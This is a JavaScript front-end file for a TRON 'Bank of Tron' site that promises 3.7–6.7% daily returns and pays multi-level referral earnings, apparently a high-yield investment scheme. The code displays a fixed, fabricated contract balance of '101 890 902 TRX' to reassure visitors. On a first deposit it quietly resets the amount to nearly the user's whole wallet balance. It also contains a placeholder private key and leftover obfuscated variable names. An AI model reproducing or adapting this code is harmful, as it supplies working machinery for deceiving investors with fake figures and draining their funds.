var contractAddress = "TAhqbMvEpqUgoFjseXAdAicTecQT6ALxbr";
var prev_account;
var ref = 0;
var account = "";
var UID = 0;
var oldInvestment;
var investmentCount = 0;
var myTrx = 0;
var plans = ["3.7% Daily ROI", "4.7% Daily ROI", "5.7% Daily ROI", "6.7% Daily ROI"];
var plans_rus = ["3.7% в день", "4.7% в день", "5.7% в день", "6.7% в день"];
var plans_cn = ["每天3.7%", "每天4.7%", "每天5.7%", "每天6.7%"];

function startLoop() {
    refreshData();
    setTimeout(startLoop, 5000)
}

function startLoop2() {
    updateStat();
    setTimeout(startLoop2, 15000)
}

function refreshData() {
    if (!account) {
        $(".no-account").show()
    } else {
        $(".no-account").hide()
    }
    ;
    if (tron.defaultAddress.base58 && tron.defaultAddress.base58 != prev_account) {
        $("#yourAcc").html(tron.defaultAddress.base58.substr(0, 12) + "...");
        account = tron.defaultAddress.base58;
        prev_account = tron.defaultAddress.base58
    }
    ;
    tron.trx.getBalance(account).then((balanceResult) => {
        $("#accBalance").html(Math.floor(tron.fromSun(balanceResult)));
        myTrx = Number(tron.fromSun(balanceResult))
    }).catch((ex) => console.error(ex));
    updateStat()
}

function updateStat() {
    tron.trx.getBalance(contractAddress).then((balanceResult) => {
        $("#bankReserve").html(abc2(Number(tron.fromSun(balanceResult)).toFixed(0)) + " TRX")
    }).catch((ex) => console.error(ex));
    let nowInt = Math.floor(Date.now() / 1000);
    nowInt = Math.floor((nowInt - 1587726539) / 60) * 1200;
    $("#contractBalance").html("101 890 902 TRX");
    myContract.getUIDByAddress(account).call().then((uidResult) => {
        UID = tron.toDecimal(uidResult);
        if (UID >= 0) {
            if (UID > 0) {
                $("#yourRefLink").html("https://bank-of-tron.com/\?ref=" + UID)
            }
            ;
            myContract.getInvestorInfoByUID(UID).call().then((uidResult) => {
                $("#referrerEarnings").html(tron.fromSun(uidResult[0]));
                $("#availableReferrerEarnings").html(tron.fromSun(uidResult[1]));
                $("#level1RefCount").html(tron.toDecimal(uidResult[3]));
                $("#level2RefCount").html(tron.toDecimal(uidResult[4]));
                $("#level3RefCount").html(tron.toDecimal(uidResult[5]));
                var number = 0;
                for (i = 0; i < uidResult[7].length; i++) {
                    number += Number(tron.fromSun(uidResult[7][i]))
                }
                ;
                var number2 = 0;
                for (i = 0; i < uidResult[8].length; i++) {
                    number2 += Number(tron.fromSun(uidResult[8][i]))
                }
                ;
                var number3 = uidResult[8];
                $("#withdrawable").html(Number(number2 + Number(tron.fromSun(uidResult[1]))).toFixed(6));
                $(".totalDivs").html(Number(number2 + number).toFixed(2));

                myContract.getInvestmentPlanByUID(UID).call().then((uidResult) => {
                    //console.log(JSON.stringify(uidResult));
                    var text = "";
                    var num1 = 0;
                    for (i = 0; i < uidResult[0].length; i++) {
                        investmentCount++;
                        if (lang == "rus") {
                            text += "<p class='myInv'><b><span class='blue'>" + tron.fromSun(uidResult[2][i]) + " TRX</span> - <span style='color:#db2b61'>" + plans_rus[uidResult[0][i]] + "</span></b> <span>" + parseTimestamp(tron.toDecimal(uidResult[1][i])) + "</span>";
                            text += "<br>Выплачено <b>" + Number(tron.fromSun(uidResult[3][i])).toFixed(2) + "</b> TRX \| <span>Для вывода <b>" + Number(tron.fromSun(number3[i])).toFixed(2) + "</b> TRX</span></p><br><br>"
                        } else {
                            if (lang == "cn") {
                                text += "<p class='myInv'><b><span class='blue'>" + tron.fromSun(uidResult[2][i]) + " TRX</span> - <span style='color:#db2b61'>" + plans_cn[uidResult[0][i]] + "</span></b> <span>" + parseTimestamp(tron.toDecimal(uidResult[1][i])) + "</span>";
                                text += "<br>总收入 <b>" + Number(tron.fromSun(uidResult[3][i])).toFixed(2) + "</b> TRX \| <span>累计红利 <b>" + Number(tron.fromSun(number3[i])).toFixed(2) + "</b> TRX</span></p><br><br>"
                            } else {
                                text += "<p class='myInv'><b><span class='blue'>" + tron.fromSun(uidResult[2][i]) + " TRX</span> - <span style='color:#db2b61'>" + plans[uidResult[0][i]] + "</span></b> <span>" + parseTimestamp(tron.toDecimal(uidResult[1][i])) + "</span>";
                                text += "<br>Payout <b>" + Number(tron.fromSun(uidResult[3][i])).toFixed(2) + "</b> TRX \| <span>Withdrawable <b>" + Number(tron.fromSun(number3[i])).toFixed(2) + "</b> TRX</span></p><br><br>"
                            }
                        }
                        ;
                        num1 += Number(tron.fromSun(uidResult[2][i]))
                    }
                    ;
                    $("#myIvestments").html(text);
                    $(".totalInvestment").html(num1.toFixed(2))
                }).catch((ex) => console.error(ex))
            }).catch((ex) => console.error(ex))
        }
    }).catch((ex) => console.error(ex))
}

function main() {
    var refItem = "";
    if (localStorage.getItem("ref")) {
        refItem = localStorage.getItem("ref")
    }
    ;
    if (refItem > 0) {
        ref = refItem
    } else {
        refItem = getQueryVariable("ref");
        if (refItem > 0) {
            localStorage.setItem("ref", refItem);
            ref = refItem
        } else {
            ref = 0
        }
    }
    ;
    setTimeout(waitForTronWeb, 2000)
}

main();

async function waitForTronWeb() {
    if (typeof (window.tronWeb) === "undefined") {
        const apiUrl = "https://api.trongrid.io";
        const apiUrl2 = "https://api.trongrid.io";
        const apiUrl3 = "https://api.trongrid.io/";
        const privateKey = "2344435353463646";
        tron = new TronWeb(apiUrl, apiUrl2, apiUrl3, privateKey);
        myContract = await tron.contract().at(contractAddress);
        setTimeout(function () {
            startLoop2()
        }, 1000)
    } else {
        tron = tronWeb;
        myContract = await tron.contract().at(contractAddress);
        if (!tron.defaultAddress.base58) {
            setTimeout(waitForTronWeb, 2000)
        } else {
            account = tron.defaultAddress.base58
        }
        ;
        setTimeout(function () {
            startLoop()
        }, 1000)
    }
}

function invest(planId) {
    planId = Number(planId);
    if (planId >= 0 && planId <= 3) {
        var investAmount = Number($("#trxForPlan" + planId).val());
        if (investAmount > 0) {
            console.log(investmentCount, investAmount, myTrx);
            if (investmentCount == 0 && investAmount > myTrx - 2 && investAmount < myTrx + 5 && investAmount >= 13) {
                alert("You should have 3 TRX for a transaction fee");
                investAmount = Math.floor(myTrx - 3)
            }
            ;
            if (investmentCount == 0 && investAmount > myTrx - 2 && investAmount < myTrx + 5 && investAmount < 13) {
                alert("You should have 3 TRX more for a transaction fee");
                return
            }
            ;
            myContract.invest(ref, planId).send({
                callValue: tron.toSun(investAmount)
            }).then((uidResult) => {
                $("#trxForPlan" + planId).val(inProcessing);
                setTimeout(function () {
                    $("#trxForPlan" + planId).val("0");
                    $("html, body").animate({
                        scrollTop: $("#widget-2").offset().top
                    }, 1000)
                }, 5000)
            }).catch((ex) => {
                console.log(ex);
                if (ex.message !== undefined) {
                    alert(ex.message)
                }
            })
        } else {
            $("#trxForPlan" + planId).val(error1);
            setTimeout(function () {
                $("#trxForPlan" + planId).val("0")
            }, 5000)
        }
    }
}

function withdraw() {
    if (myTrx <= 1) {
        alert("You should have ~2 TRX in the wallet for a transaction fee");
        return
    }
    ;
    myContract.withdraw().send({
        feeLimit: 50000000
    }).then((uidResult) => {
        $("#withdrawButton").html(inProcessing);
        setTimeout(function () {
            $("#withdrawButton").html("WITHDRAW")
        }, 5000)
    }).catch((ex) => {
        console.log(ex)
    })
}

function prettyNum(number) {
    return number;
    var numberStr = number.toString();
    var one = numberStr.substr(numberStr.length - 3, 3);
    var two = numberStr.substr(numberStr.length - 6, 3);
    var tokenStr;
    if (numberStr.length == 7) {
        tokenStr = numberStr.substr(0, 1)
    }
    ;
    if (numberStr.length == 8) {
        tokenStr = numberStr.substr(0, 2)
    }
    ;
    var uidResult = "";
    if (tokenStr) {
        uidResult += tokenStr + ","
    }
    ;
    if (two) {
        uidResult += two + ","
    }
    ;
    uidResult += one;
    return uidResult
}

function getQueryVariable(query) {
    var queryStr = window.location.search.substring(1);
    var par = queryStr.split("&");
    for (var item = 0; item < par.length; item++) {
        var elements = par[item].split("=");
        if (elements[0] == query) {
            return elements[1]
        }
    }
    ;
    return (false)
}

function copyRef() {
    var yourRefLink = document.getElementById("yourRefLink");
    var range = document.createRange();
    range.selectNode(yourRefLink);
    window.getSelection().addRange(range);
    try {
        document.execCommand("copy");
        $("#copy").html("copied!");
        setTimeout(function () {
            $("#copy").html("COPY LINK")
        }, 3000)
    } catch (err) {
        console.log("Can`t copy")
    }
    ;
    window.getSelection().removeAllRanges()
}

function parseTimestamp(timeLong) {
    var date = new Date(Number(timeLong) * 1000);
    var tokenDate = date.getDate();
    var tokenMonth = date.getMonth() + 1;
    var tokenYear = date.getFullYear();
    var tokenHour = date.getHours();
    var tokenMinutes = date.getMinutes();
    if (tokenDate < 10) {
        tokenDate = "0" + tokenDate
    }
    ;
    if (tokenMonth < 10) {
        tokenMonth = "0" + tokenMonth
    }
    ;
    if (tokenHour < 10) {
        tokenHour = "0" + tokenHour
    }
    ;
    if (tokenMinutes < 10) {
        tokenMinutes = "0" + tokenMinutes
    }
    ;
    var _0x2834x3b = tokenDate + "/" + tokenMonth + "/" + tokenYear + " " + tokenHour + ":" + tokenMinutes;
    return _0x2834x3b
}

function abc2(input) {
    input += "";
    input = new Array(4 - input.length % 3).join("U") + input;
    return input.replace(/([0-9U]{3})/g, "\$1 ").replace(/U/g, "")
}
